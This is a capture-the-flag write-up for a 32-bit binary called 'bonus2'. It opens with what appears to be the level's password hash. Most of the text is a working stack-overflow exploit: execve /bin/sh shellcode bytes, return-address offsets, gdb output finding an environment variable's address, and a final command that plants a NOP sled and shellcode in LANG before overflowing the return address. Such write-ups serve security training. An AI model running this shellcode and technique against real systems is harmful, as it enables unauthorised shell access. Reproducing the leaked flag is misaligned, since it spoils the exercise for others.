bonus2:579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

`LANG` env var change behavior of the binary

offset 23

LANG=nl
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC BBBBBBBBBBBBBBBBBBBBBBBXXXX`
`XXXX` => the return address for the shellcode `0xbffff550` + 1 & `0xbffff550` + 5
shellcode => `\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80`

first argument => `python -c 'print "AXXXX\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80" + "B" * 9'`
second argument => `python -c 'print "A" * 23 + "\x54\xf5\xff\xbf"'`

`gdb --args ./bonus2 $(python -c 'print "AXXXX\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80" + "B" * 9') $(python -c 'print "A" * 23 + "XXXX"')`

Doesnt work because overwrite made for the return value of `greetuser` and the buffer we are using to store
the shellcode is deallocated
Lets try by storing it avec `nl` in the env

Find the address of the env var in gdb:
```shell
(gdb) b *main +130
Breakpoint 1 at 0x80485ab
(gdb) run a a
Starting program: /home/user/bonus2/bonus2 a a

Breakpoint 1, 0x080485ab in main ()
(gdb) x $eax
0xbffffe7c:	0x90906c6e
```
address env => `0xbffffe7c` 

```shell
export LANG=nl$(echo -en "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80")

./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\x9c\xfe\xff\xbf"')
```